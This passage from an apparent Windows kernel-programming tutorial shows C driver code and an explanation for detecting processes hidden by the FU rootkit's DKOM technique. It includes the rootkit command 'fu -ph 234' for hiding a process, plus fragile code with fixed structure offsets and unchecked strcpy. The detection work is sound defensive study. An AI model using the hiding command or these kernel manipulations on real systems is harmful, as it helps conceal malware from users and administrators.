style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>PEPROCESS
p1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>long
gKiWaitOutListHead,i,pid,gKiWaitInListHead;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned
char *ptr,*nameptr;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>int
found,j;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LIST_ENTRY
*cur, *start;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;DriverUnload
= DriverUnload;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;MajorFunction[IRP_MJ_CREATE]
= DriverDispatcher;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ptr
= (unsigned char *)KeWaitForSingleObject;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>for(
i = 0; i &lt; 4096; i++ ) <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if(*ptr
== 0xb9 &amp;&amp; *(ptr+5) == 0x84 &amp;&amp; *(ptr+6) == 0xc0 &amp;&amp; *(ptr+24)
== 0xb9)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>gKiWaitInListHead
= *(long *)(ptr + 1);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>gKiWaitOutListHead
= *(long *)(ptr + 25);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>break;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ptr++;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>start
= (LIST_ENTRY *)gKiWaitOutListHead;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>cur
= start-&gt;Flink;<span style="mso-spacerun: yes">      </span><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>do<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>pid
= *((long *)((long)cur + 388));<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>nameptr
= (unsigned char *)(*((long *)((long)cur + 464))) + 508;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>insert(pid,nameptr);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>cur
= cur-&gt;Flink;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}
while(cur != start);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>start
= (LIST_ENTRY *)gKiWaitInListHead;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>cur
= start-&gt;Flink;<span style="mso-spacerun: yes">      </span><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>do<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>pid
= *((long *)((long)cur + 388));<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>nameptr
= (unsigned char *)(*((long *)((long)cur + 464))) + 508;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>insert(pid,nameptr);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>cur
= cur-&gt;Flink;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}
while(cur != start);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>//for
( i = 0; i &lt; nprocs ; i++)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>//DbgPrint(&quot;%s
%d&quot;,procs[i].name,procs[i].pid);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p1
= (PEPROCESS)PsGetCurrentProcess();<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>cur
= start = (LIST_ENTRY *)((long)p1 + 160);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>do<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>int
pid = *(long *)((long)cur -4);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>//DbgPrint(&quot;%s
%d&quot;,(long)cur + 348,pid);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>insert1(pid,(char
*)((long)cur + 348));<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>cur
= cur-&gt;Flink;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}
while(cur != start);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;nprocs=%d
nprocs1=%d&quot;,nprocs,nprocs1);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>for(
i = 0 ; i &lt; nprocs ; i++)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>found
= 0;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>for
( j = 0 ; j &lt; nprocs1 ; j++)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
( procs[i].pid == procs1[j].pid)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>found
= 1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>break;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
( found == 0 &amp;&amp; procs[i].pid != 0)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;%s
%d has been hidden&quot;,procs[i].name,procs[i].pid);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>This
program is our first stab at writing a program that tells us whether someone
has hidden a process using Direct kernel Object Manipulation which we first
read about in the FU toolkit. This program displays all processes that have
been hidden by using say the FU rootkit. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Most
of the program has been done before by us. We first start off in a for loop
finding the addresses of the two linked list of threads like before. We then
scan through each of the linked lists like we did before. We find out the pid
stored in the variable val and the name of the process stored in nameptr. Then
we do something different. Instead of displaying the values, we call a function
insert. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>This
function adds the process id and name of the program to a global array of zzz
structures if the pid is not already present in the array. This array called
procs should at the end of the do loop contain one instance only of the pid and
program name. The problem with the thread linked are that if a program creates
10 threads, it will be seen in the link list 10 times. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>We
want to eliminate multiple instances of the pid’s and have only one instance.
The function insert is called with the pid and program name.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>In
this function we use a global variable nprocs to keep tab of how many array members
contain pids. To start with its value is zero and each time we add a new member
to the array nprocs, we increase nprocs by 1. We have created a global array
nprocs to have upto a 1000 members. It would be better to dynamically grow the
array each time. We used the code the Klister rootkit used and thus believe if
he could do it why not us. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Each
time we scan the array upto nprocs checking if the pid is already there. This
structure zzz that each array member conforms to contains a pid member and a array
17 bytes large to store the program name. If we meet a match in the for loop we
simply return and do nothing else. If no match we have a unique pid and we use
the nprocs variable as an offset into the array and set the pid member to the
pid parameter. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>We
also strcpy the name into the 17 byte array. Finally we increase the nprocs
variable by 1. At the end of the do loop we have nprocs tells us how many
unique process are running on our machine but now it add the caveat that these
processes are associated with a thread. We then use the second thread linked
list and place all unique processes into the nprocs array.<span
style="mso-spacerun: yes">  </span><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>We
then use a program that we wrote earlier, which scans all the EPROCESS
structures whose address we get from the PsGetCurrentProcess function. It is
here where we find a list of all current processes which are used for
displaying in program like task manager. We scan this list and place all the
unique process id’s in a array procs1 using the insert1 function. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>We
had to use the same logic as before as even in this list we can have the same
function name twice. We display the variables nprocs and nprocs1 that give us a
list of processes in both arrays. Now if someone has hidden a process from the
list of processes which is what FU does, its name will not be there in this
list but as it has created a thread, it will exists in the thread linked list. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>So
all that we now do is scan the first array of structures procs and pick up each
pid present. We know that nprocs gives us the total number of unique pids. We
then use another for loop to scan the entire second array using nprocs1 as the
for terminating value. If we do not find the pid in the procs1 array we know
that it has been hidden. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Thus
every process that has a thread must be present in the second or procs1 array.
The reverse does not make sense as if the process has been hidden in procs1, we
will not know that it has been removed. This is why we check the procs array
against the procs1<span style="mso-spacerun: yes">  </span>array and not vice
versa. Thus use fu as fu –ph 234 which will hide process 234. When you run our
driver, it will come back and tell us that process 234 has been hidden.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>P58<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>r.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;ntddk.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;stdio.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct
zzz<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>long
pid;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>char
name[17];<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>};<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>PEPROCESS
p1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct
zzz procs[1000];<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>struct
zzz procs1[1000];<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>PKTIMER<span
style='mso-tab-count:1'>         </span>gTimer;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>PKDPC<span
style='mso-tab-count:1'> </span>gDPCP;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LARGE_INTEGER
timeout;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>long
gKiWaitOutListHead,i,pid,gKiWaitInListHead;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>void
insert (long pid, char *nameptr,long *pnprocs) <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>int
i;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>for
(i = 0; i &lt; *pnprocs; i++)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
(procs[i].pid == (long)pid)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>procs
[*pnprocs].pid = pid;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>strcpy
(procs[*pnprocs].name, nameptr); <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>*pnprocs
= *pnprocs + 1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>void
insert1(long pid, char *nameptr,long *pnprocs1) <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>int
i;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>for
(i = 0; i &lt; *pnprocs1; i++)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
(procs1[i].pid == (long)pid)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>procs1[*pnprocs1].pid
= pid;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>strcpy
(procs1[*pnprocs1].name, nameptr); <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>*pnprocs1
= *pnprocs1 + 1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>VOID
abc(PKDPC Dpc,PVOID DeferredContext,PVOID sys1,PVOID sys2)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned
char *nameptr;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>int
nprocs=0,nprocs1=0;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>int
found,j;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LIST_ENTRY
*cur, *start;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Timer&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
